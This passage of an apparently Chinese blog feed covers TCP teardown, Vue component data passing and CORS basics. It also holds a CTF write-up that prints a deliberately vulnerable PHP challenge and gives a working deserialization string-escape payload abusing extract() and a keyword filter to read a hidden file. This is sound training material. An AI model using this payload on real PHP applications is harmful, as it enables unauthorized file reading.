successful"></p><p>（1）当客户端无数据要发送时，客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。（此时服务器发送给客户端的数据不一定发送完了，未必会马上会关闭SOCKET,）</p><p>（2）服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。</p><p>（3）服务器B关闭与客户端A的连接，发送一个FIN给客户端A。（此时服务端已经没有数据要发送了）</p><p>（4）客户端A发回ACK报文确认，并将确认序号设置为收到序号加1，此时完全释放连接。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;TCP（传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议。连接到不同但互连的计算机通信网络的主计算机中的成对进程之间依靠TCP提供可靠的通信服务。&lt;/p&gt;
&lt;h5 id=&quot;TCP三次握手&quot;&gt;&lt;a href=&quot;#TCP三次握手&quot; class=&quot;headerl
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>easy_serialize_php</title>
    <link href="http://yoursite.com/2020/05/30/easy-serialize-php/"/>
    <id>http://yoursite.com/2020/05/30/easy-serialize-php/</id>
    <published>2020-05-30T09:21:29.000Z</published>
    <updated>2020-05-30T10:13:07.222Z</updated>
    
    <content type="html"><![CDATA[<p>打开是一串php代码。再结合标题，这就是道反序列化的php题了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function &#x3D; @$_GET[&#39;f&#39;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</span><br><span class="line">    $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">    return preg_replace($filter,&#39;&#39;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;</span><br><span class="line">$_SESSION[&#39;function&#39;] &#x3D; $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#39;img_path&#39;])&#123;</span><br><span class="line">    $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;</span><br><span class="line">    highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">    eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;</span><br><span class="line">    $userinfo &#x3D; unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解读一下源码。</p><ul><li><p>这里可以读取phpinfo。并且提示了里面可能会有有用信息，看一下。flag应该就是在这个文件了。<br><img src="/images/pasted-27.png" alt="upload successful"></p></li><li><p>这里有三个SESSION。其中function和img_path可控。但是img_path只能获得指定图片的base64编码或是我们传入的参数的base64+sha1。经过sha1后实际上这个参数已经不可控了</p></li></ul><p><img src="/images/pasted-23.png" alt="upload successful"></p><ul><li><code>extract($_POST);</code> 读取POST数据，在数组中把变量导入到当前的符号表中。他有一个非常实用的功能，在表单传值中，如果html代码为</li></ul><p><img src="/images/pasted-25.png" alt="upload successful"></p><p> 那么<br><img src="/images/pasted-26.png" alt="upload successful"></p><p>但是该函数也存在变量覆盖的问题。当传入的参数名已存在时，就会覆盖掉当前的变量</p><ul><li>这里对所有的SESSION序列化后过滤，不能包含flag,php等关键词。最后对session信息做一个反序列化。并把img的值经base64解码后进行读取。那么利用点就在这里了。</li></ul><p><img src="/images/pasted-24.png" alt="upload successful"></p><ol><li>由于使用了extract函数，那么我们可以利用变量覆盖传入自定义的session覆盖掉当前的session值。</li><li>我们只能通过session[img]读取flag。而该参数又不可控，只能利用反序列化字符逃逸</li></ol><p>在本地看一下序列化的结果。<br><img src="/images/pasted-28.png" alt="upload successful"><br>这里我们需要截取的是img这一块的数据。<br><code>;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code>（已替换为d0g3_f1ag.php的base64编码）</p><p>我们最后序列化后的结果中应该是有两个键值对，一个是我们想要逃逸的img，另一个是传入的参数。</p><p>形式为：<code>a:2:{s:n:&quot;&quot;;s:xx:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code> 其中xx为两位数，代表当前字符串的长度。n为构造的session的长度。为了让img逃逸出去。需要想办法把s:xx这一串吃掉。”;s:40:一共是七个字符。所以n应该为7。那么session就应该为flagphp。刚好过滤掉七个字符。</p><p>此时为<code>a:2:{s:7:&quot;&quot;;s:xx:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code></p><p>这时候花括号内第一个键值对还差一个值，再构造一个s:1:”a”;即可。</p><p><code>a:2:{s:7:&quot;&quot;;s:xx:&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code></p><p>payload就出来了 <code>_SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code></p><p>发包过去</p><p><img src="/images/pasted-29.png" alt="upload successful">。这时候再改一下base64的编码即可。长度也是20位<br>得到flag</p><p><img src="/images/pasted-30.png" alt="upload successful"></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12261610.html" target="_blank" rel="noopener">参考链接</a></p><p><a href="https://www.jianshu.com/p/8e8117f9fd0e" target="_blank" rel="noopener">参考链接</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;打开是一串php代码。再结合标题，这就是道反序列化的php题了。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;s
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Vue组件传值</title>
    <link href="http://yoursite.com/2020/05/29/Vue%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"/>
    <id>http://yoursite.com/2020/05/29/Vue%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/</id>
    <published>2020-05-29T10:27:33.000Z</published>
    <updated>2020-05-30T03:54:38.403Z</updated>
    
    <content type="html"><![CDATA[<p>Vue组件间的值是不能直接引用的，需要进行值传递。Vue中有四种值传递的方式。</p><ol><li>父组件向子组件传值</li><li>子组件向父组件传值</li><li>兄弟组件间的传值(Vuex，才学过这里就不说了)</li><li>$ref</li></ol><p>现在来依次讨论。</p><h5 id="父组件向子组件传值"><a href="#父组件向子组件传值" class="headerlink" title="父组件向子组件传值"></a>父组件向子组件传值</h5><p>父传子的实现方式是通过props属性，子组件通过props属性接收从父组件传过来的值，而父组件传值的时候使用 v-bind 将子组件中预留的变量名绑定为data里面的数据即可</p><p>举个例子：</p><p>在father.vue中写如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">  &lt;p&gt;这是父组件&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;!-- 使用v-bind绑定属性，传值给子组件 --&gt;</span><br><span class="line">  &lt;Child :newmsg&#x3D;&quot;msg&quot;&gt;&lt;&#x2F;Child&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &#39;..&#x2F;components&#x2F;son&#39; &#x2F;&#x2F;引入子组件</span><br><span class="line">export default &#123;</span><br><span class="line">  name:&#39;&#39;,</span><br><span class="line">  data()&#123;</span><br><span class="line">   return &#123;</span><br><span class="line">       msg:&#39;这是父组件内的msg&#39;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components:&#123;</span><br><span class="line">      Child</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>在son.vue中写如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;p&gt;这是子组件&lt;&#x2F;p&gt;</span><br><span class="line">&lt;h1&gt;接受到父组件消息:&#123;&#123;newmsg&#125;&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name:&#39;&#39;,</span><br><span class="line">  props:&#123;</span><br><span class="line">    newmsg:&#123;</span><br><span class="line">        type: String  &#x2F;&#x2F;子组件使用props来接受数据，并限定对象类型为string</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  data()&#123;</span><br><span class="line">   return &#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>在router/index中进行路由挂载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import Vue from &#39;vue&#39;</span><br><span class="line">import Router from &#39;vue-router&#39;</span><br><span class="line">import HelloWorld from &#39;@&#x2F;components&#x2F;HelloWorld&#39;</span><br><span class="line">import father from &#39;@&#x2F;components&#x2F;father&#39;</span><br><span class="line">import Child from &#39;@&#x2F;components&#x2F;son&#39;</span><br><span class="line"></span><br><span class="line">Vue.use(Router)</span><br><span class="line"></span><br><span class="line">export default new Router(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: &#39;&#x2F;&#39;,</span><br><span class="line">      name: &#39;HelloWorld&#39;,</span><br><span class="line">      component: HelloWorld</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      path:&#39;&#x2F;father&#39;,</span><br><span class="line">      name: &#39;father&#39;,</span><br><span class="line">      component: father</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      path:&#39;&#x2F;son&#39;,</span><br><span class="line">      name: &#39;son&#39;,</span><br><span class="line">      component: Child</span><br><span class="line">    &#125;</span><br><span class="line">  ] </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这时候访问 <code>http://localhost:8080/#/father</code> 可以看到父组件的值已经成功传给了子组件<br><img src="/images/pasted-18.png" alt="upload successful"></p><h5 id="子组件向父组件传值"><a href="#子组件向父组件传值" class="headerlink" title="子组件向父组件传值"></a>子组件向父组件传值</h5><p>利用vue中的$emit将想要传递的值通过函数的形式传出，在父组件接收，格式</p><p><code>this.$emit(event,arg) event:事件名字，arg:要传出的值</code></p><p>$emit 绑定一个自定义事件event，当这个这个语句被执行到的时候，就会将参数arg传递给父组件，父组件通过@event监听并接收参数。</p><p>还是直接上代码。在father.vue中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;div&gt;这是父组件&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div&gt;接收到的子组件传值是：&#123;&#123;msg&#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;Child @tranToFather&#x3D;&quot;getMag&quot; &#x2F;&gt; &#x2F;&#x2F;tranToFather在子组件中定义，在父组件中绑定并触发getMsg方法</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &quot;..&#x2F;components&#x2F;son&quot;;</span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    Child</span><br><span class="line">  &#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      msg: &quot;&quot;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    getMag(msg) &#123;</span><br><span class="line">      this.msg &#x3D; msg;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>在son.vue中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;p&gt;这是子组件&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;button @click&#x3D;&quot;toParent&quot;&gt;点击向父组件发送信息&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      msg: &quot;这是传给父组件的值&quot;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    toParent() &#123;</span><br><span class="line">      this.$emit(&quot;tranToFather&quot;, this.msg);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这是点击前<br><img src="/images/pasted-19.png" alt="upload successful"></p><p>点击后成功传值</p><p><img src="/images/pasted-20.png" alt="upload successful"></p><h5 id="ref和-refs"><a href="#ref和-refs" class="headerlink" title="$ref和$refs"></a>$ref和$refs</h5><p>先看一下官方文档的解释</p><p><a href="https://cn.vuejs.org/v2/guide/components-edge-cases.html#%E8%AE%BF%E9%97%AE%E5%AD%90%E7%BB%84%E4%BB%B6%E5%AE%9E%E4%BE%8B%E6%88%96%E5%AD%90%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">链接</a><br><img src="/images/pasted-21.png" alt="upload successful"></p><p>简单解释就是</p><ol><li>如果ref用在子组件上，指向的是组件实例，可以理解为对子组件的索引，通过$ref可能获取到在子组件里定义的属性和方法。</li><li>如果ref在普通的 DOM 元素上使用，引用指向的就是 DOM 元素，通过$ref可能获取到该DOM 的属性集合，轻松访问到DOM元素，作用与JQ选择器类似。</li></ol><p>这里我们讨论第一种情况。</p><p>在father.vue中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line"> &lt;div&gt;</span><br><span class="line"> &lt;h1&gt;这是父组件&lt;&#x2F;h1&gt;</span><br><span class="line"> &lt;child ref&#x3D;&quot;msg&quot;&gt;&lt;&#x2F;child&gt; &#x2F;&#x2F;子组件中让msg指向ref，此时msg就指向了子组件</span><br><span class="line"> &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line"> import Child from &#39;..&#x2F;components&#x2F;son.vue&#39;</span><br><span class="line"> export default &#123;</span><br><span class="line">     data() &#123;</span><br><span class="line">         return &#123;</span><br><span class="line">             msg:&#39;&#39;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;,</span><br><span class="line"> components: &#123;</span><br><span class="line">     Child</span><br><span class="line">     &#125;,</span><br><span class="line"> mounted: function () &#123;</span><br><span class="line">  this.$refs.msg.getMsg(&#39;调用子组件的方法并渲染&#39;),</span><br><span class="line">  console.log(this.$refs.msg.son_data);  &#x2F;&#x2F;这里调用的是子组件的数据</span><br><span class="line">  </span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>子组件中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!-- 子组件 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;这是子组件&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;h3&gt;&#123;&#123;msg&#125;&#125;&lt;&#x2F;h3&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"> export default &#123;</span><br><span class="line"> data()&#123;</span><br><span class="line">  return&#123;</span><br><span class="line">  msg:&#39;&#39;,</span><br><span class="line">  son_data: &#39;子组件的数据&#39;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> methods:&#123;</span><br><span class="line">  getMsg(msg)&#123;</span><br><span class="line">  this.msg&#x3D;msg;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>看一下运行结果，页面成功渲染，控制台也打印出了子组件的data<br><img src="/images/pasted-22.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Vue组件间的值是不能直接引用的，需要进行值传递。Vue中有四种值传递的方式。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;父组件向子组件传值&lt;/li&gt;
&lt;li&gt;子组件向父组件传值&lt;/li&gt;
&lt;li&gt;兄弟组件间的传值(Vuex，才学过这里就不说了)&lt;/li&gt;
&lt;li&gt;$ref&lt;/li&gt;
&lt;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>跨域请求与同源策略</title>
    <link href="http://yoursite.com/2020/05/29/%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <id>http://yoursite.com/2020/05/29/%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</id>
    <published>2020-05-29T07:48:55.000Z</published>
    <updated>2020-05-29T08:59:01.640Z</updated>
    
    <content type="html"><![CDATA[<h5 id="跨域请求"><a href="#跨域请求" class="headerlink" title="跨域请求"></a>跨域请求</h5><p>1.浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都是跨域。（注意http和https是不同的协议）</p><p>2.只要协议、域名、端口有任何一个不同，都被当作是不同的域，之间的请求就是跨域操作。</p><p>举个例子：</p><ul><li><p>一个域名为 <code>aaa.com</code>的站点，去请求 <code>aaa.com/user/admin</code> 这个地址的资源时。由于域名(aaa.com)、协议(都为http或https，默认为http)、端口(默认80)都相同，那么本次请求是同域的。</p></li><li><p>当 <code>aaa.com</code>去请求<code>bbb.com</code>时。这个请求就是跨域的。(域名不同)。再换个例子。当<code>aaa.com:8888</code>去请求<code>aaa.com:80</code>时，由于端口不同，这个请求也是跨域的。</p></li></ul><p>用一张网上的图</p><p><img src="/images/pasted-14.png" alt="upload successful"></p><p>浏览器限制跨域请求的根本原因在于防止CSRF攻击。有关CSRF攻击看下面这篇文章</p><p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">浅谈CSRF攻击方式</a></p><h5 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h5><p>同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。现在所有的可支持 Javascript 的浏览器都会使用这个策略。不过同源策略也不是绝对的。</p><p><strong>不受同源策略限制的方式</strong></p><ul><li><code>&lt;script&gt;</code> <code>&lt;img&gt;</code> <code>&lt;iframe&gt;</code> <code>&lt;link&gt;</code> <code>&lt;video&gt;</code> <code>&lt;audio&gt;</code>等带有src属性的标签可以从不同的域加载和执行资源。</li></ul><h5 id="解决跨域冲突"><a href="#解决跨域冲突" class="headerlink" title="解决跨域冲突"></a>解决跨域冲突</h5><p>一、<strong>JSONP</strong></p><ul><li><p>JSONP 本质上是利用 <code>&lt;script&gt;</code> <code>&lt;img&gt;</code> <code>&lt;iframe&gt;</code> 等标签不受同源策略限制，可以从不同域加载并执行资源的特性，来实现数据跨域传输。</p></li><li><p>JSONP由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数，而数据就是传入回调函数中的JSON数据。</p></li><li><p>JSONP 的理念就是，与服务端约定好一个回调函数名，服务端接收到请求后，将返回一段 Javascript，在这段 Javascript 代码中调用了约定好的回调函数，并且将数据作为参数进行传递。当网页接收到这段 Javascript 代码后，就会执行这个回调函数，这时数据已经成功传输到客户端了。</p></li></ul><p>这里有一篇关于json和jsonp实现跨域的文章讲得很细致易懂，推荐看这个</p><p><a href="https://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html" target="_blank" rel="noopener">关于JSON和JSONP</a></p><p><strong>PS:浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所要域的资源再返回给客户端。</strong></p><p>二、<strong>CORS（跨源资源共享）</strong></p><p> 跨源资源共享 Cross-Origin Resource Sharing(CORS) 是一个新的 W3C 标准，它新增的一组HTTP首部字段，允许服务端其声明哪些源站有权限访问哪些资源。可以理解为新增了白名单，指定可访问的源地址。</p><p>罗列一些CORS 中新增的 HTTP 首部字段</p><ul><li><p>Access-Control-Allow-Origin</p><p>  响应首部中可以携带这个头部表示服务器允许哪些域可以访问该资源，语法：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: &lt;origin&gt; | *</span><br></pre></td></tr></table></figure><p>  origin 参数的值指定了允许访问该资源的外域 URI。对于不需要携带身份凭证的请求，服务器可以指定该字段的值为通配符，表示允许来自所有域的请求。</p></li><li><p>Access-Control-Allow-Methods<br>  预检请求的响应，指明实际请求所允许使用的HTTP方法。其语法如下：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</span><br></pre></td></tr></table></figure></li><li><p>Access-Control-Allow-Credentials</p><p>  是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。其语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">深入了解CORS</a></p><p>下面的是重点</p><h5 id="Vue使用axios实现跨域"><a href="#Vue使用axios实现跨域" class="headerlink" title="Vue使用axios实现跨域"></a>Vue使用axios实现跨域</h5><p>使用vue-cli这种脚手架工具开发时，由于项目本身启动本地服务是需要占用一个端口的，所以必然会产生跨域的问题。这里主要探讨proxyTable</p><ul><li>服务器端设置跨域</li></ul><p>header(“Access-Control-Allow-Origin:*”);</p><p>header(“Access-Control-Allow-Headers:content-type”);</p><p>header(“Access-Control-Request-Method:GET,POST”);</p><ul><li><p>使用proxyTable（推荐）</p><ol><li>找到根目录下config文件夹下的index.js文件。（以知涯项目为例）</li></ol></li></ul><p><img 